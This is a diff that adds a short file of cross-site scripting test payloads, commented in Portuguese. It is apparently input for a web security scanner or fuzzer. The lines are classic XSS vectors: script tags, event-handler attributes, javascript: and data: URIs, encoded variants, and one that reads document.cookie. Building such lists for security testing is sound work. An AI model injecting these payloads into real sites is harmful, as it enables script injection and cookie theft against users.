@@ -1,0 +1,27 @@
+# Payloads XSS para teste
+# Adicione um payload por linha
+
+<script>alert('XSS')</script>
+javascript:alert('XSS')
+<img src=x onerror=alert('XSS')>
+'><script>alert(document.cookie)</script>
+<svg/onload=alert('XSS')>
+javascript&#58;alert('XSS')
+&#x6A;avascript:alert('XSS')
+<iframe src='javascript:alert(`XSS`)'>
+" onfocus=alert('XSS') autofocus>
+<body onload=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+<div onmouseover='alert("XSS")'></div>
+<a href="javascript:alert('XSS')">Click me</a>
+<input type="text" value="" onmouseover="alert('XSS')" />
+<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
+<math><maction actiontype="statusline#" xlink:href="javascript:alert('XSS')">Click</maction>
+<iframe src="data:text/html,<script>alert('XSS')</script>">
+<video><source onerror="alert('XSS')">
+<video poster=javascript:alert('XSS')//></video>
+<audio src=x onerror=alert('XSS')>
+<noscript><p title="</noscript><img src=x onerror=alert('XSS')">
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert('XSS')"></div>
+<link rel="stylesheet" href="javascript:alert('XSS');">
